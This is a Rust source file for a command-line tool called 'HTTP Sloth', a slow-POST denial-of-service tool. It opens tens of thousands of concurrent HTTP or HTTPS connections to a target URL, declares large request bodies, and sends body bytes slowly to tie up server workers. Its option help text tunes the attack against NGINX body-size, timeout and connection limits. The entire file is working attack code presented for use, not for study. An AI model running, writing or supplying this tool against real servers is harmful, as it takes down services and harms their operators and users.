use std::{
    convert::TryFrom,
    io,
    net::ToSocketAddrs,
    pin::Pin,
    sync::{
        Arc,
        atomic::{AtomicUsize, Ordering},
    },
    task::{Context, Poll},
    thread::sleep,
    time::Duration,
};

extern crate clap;
use clap::{Arg, Command};

extern crate env_logger;
use env_logger::{Builder, Env};

#[macro_use]
extern crate log;

use tokio::{
    io::{AsyncWrite, AsyncWriteExt},
    net::TcpStream,
    time,
};

use tokio_rustls::{
    TlsConnector,
    client::TlsStream,
    rustls::{ClientConfig, RootCertStore, pki_types::ServerName},
};

use url::Url;

enum Unistream {
    Plain(TcpStream),
    Tls(Box<TlsStream<TcpStream>>),
}

impl AsyncWrite for Unistream {
    fn poll_write(
        self: Pin<&mut Self>,
        cx: &mut Context<'_>,
        buf: &[u8],
    ) -> Poll<std::io::Result<usize>> {
        match self.get_mut() {
            Self::Plain(s) => Pin::new(s).poll_write(cx, buf),
            Self::Tls(s) => Pin::new(s).poll_write(cx, buf),
        }
    }
    fn poll_flush(self: Pin<&mut Self>, cx: &mut Context<'_>) -> Poll<std::io::Result<()>> {
        match self.get_mut() {
            Self::Plain(s) => Pin::new(s).poll_flush(cx),
            Self::Tls(s) => Pin::new(s).poll_flush(cx),
        }
    }
    fn poll_shutdown(self: Pin<&mut Self>, cx: &mut Context<'_>) -> Poll<std::io::Result<()>> {
        match self.get_mut() {
            Self::Plain(s) => Pin::new(s).poll_shutdown(cx),
            Self::Tls(s) => Pin::new(s).poll_shutdown(cx),
        }
    }
}

#[tokio::main]
async fn main() -> io::Result<()> {
    Builder::from_env(Env::default().default_filter_or("info")).init();

    let arguments = Command::new("HTTP Sloth")
        .arg(Arg::new("url")
             .long("url")
             .value_name("URL")
             .help("Target URL.")
             .required(true))
        .arg(Arg::new("content-length")
             .long("content-length")
             .value_name("BYTES")
             .help("Content-Length request header. Must be less than client_max_body_size (NGINX)"))
        .arg(Arg::new("interval")
             .value_name("SECONDS")
             .long("interval")
             .help("Byte to byte interval. Should be less than server's client_body_timeout (NGINX) value."))
        .arg(Arg::new("max-connections")
             .long("max-connections")
             .value_name("INTEGER")
             .help("Higher cap for simultaneously opened connections. Should be more than server can handle (1024 NGINX default)."))
        .get_matches();

    let parsed_url = Url::parse(arguments.get_one::<String>("url").unwrap()).unwrap();
    let host = parsed_url.host_str().unwrap().to_owned();
    let path = parsed_url.path();
    let content_length = *arguments
        .get_one::<u32>("content-length")
        .unwrap_or(&50_000);
    let tick = Duration::from_secs(*arguments.get_one::<u64>("interval").unwrap_or(&50));
    let max_connections_count: usize = *arguments
        .get_one::<usize>("max-connections")
        .unwrap_or(&32_768);
    let start = format!(
        "POST {} HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\nContent-Length: {}\r\n\r\n",
        path, &host, content_length
    );
    let addr = format!(
        "{}:{}",
        parsed_url.host_str().unwrap(),
        parsed_url.port_or_known_default().unwrap()
    )
    .to_socket_addrs()
    .unwrap()
    .next()
    .unwrap();
    let scheme = parsed_url.scheme().to_owned();

    let live_connections = Arc::new(AtomicUsize::new(0));

    let maybe_tls_connector = if "https" == scheme {
        let root_store = RootCertStore::from_iter(webpki_roots::TLS_SERVER_ROOTS.iter().cloned());

        let config = ClientConfig::builder()
            .with_root_certificates(root_store)
            .with_no_client_auth();

        let connector: TlsConnector = Arc::new(config).into();
        let domain = ServerName::try_from(host).unwrap();
        Some((connector, domain))
    } else {
        None
    };

    {
        let mut interval = time::interval(Duration::from_secs(1));
        let live_connections = live_connections.clone();
        tokio::spawn(async move {
            loop {
                interval.tick().await;
                info!(
                    "Live Connections: {}",
                    live_connections.load(Ordering::SeqCst)
                );
            }
        });
    }

    loop {
        let live_connections = live_connections.clone();
        if live_connections.load(Ordering::SeqCst) >= max_connections_count {
            sleep(Duration::from_secs(1));
            continue;
        }

        let connection_number = live_connections.fetch_add(1, Ordering::SeqCst) + 1;
        let start = start.clone();
        let tls_setup = maybe_tls_connector.clone();

        tokio::spawn(async move {
            let socket = TcpStream::connect(&addr).await.map_err(|e| {
                live_connections.fetch_sub(1, Ordering::SeqCst);
                let message = format!(
                    "ERROR: TcpStream::connect: Connection number: {}: {}",
                    connection_number, e
                );
                debug!("{}", message);
                io::Error::other(message)
            })?;

            let mut connection = if let Some((connector, domain)) = tls_setup {
                Unistream::Tls(Box::new(connector.connect(domain, socket).await.map_err(
                    |e| {
                        live_connections.fetch_sub(1, Ordering::SeqCst);
                        let message = format!(
                            "ERROR: tokio_tls::TlsConnector.connect: Connection number: {}: {}",
                            connection_number, e
                        );
                        debug!("{}", message);
                        io::Error::other(message)
                    },
                )?))
            } else {
                Unistream::Plain(socket)
            };

            // Write start
            AsyncWriteExt::write_all(&mut connection, start.as_bytes())
                .await
                .map_err(|e| {
                    live_connections.fetch_sub(1, Ordering::SeqCst);
                    let message = format!(
                        "ERROR: Start write_all await: Connection number: {}: {}",
                        connection_number, e
                    );
                    debug!("{}", message);
                    io::Error::other(message)
                })?;
            let mut interval = time::interval(tick);
            tokio::spawn(async move {
                interval.tick().await;
                // Write a byte into a body
                AsyncWriteExt::write_u8(&mut connection, 1u8)
                    .await
                    .map_err(|e| {
                        live_connections.fetch_sub(1, Ordering::SeqCst);
                        let message = format!(
                            "ERROR: Body write await: Connection number: {}: {}",
                            connection_number, e
                        );
                        debug!("{}", message);
                        io::Error::other(message)
                    })?;
                Ok::<(), io::Error>(())
            });
            Ok::<(), io::Error>(())
        });
    }
}
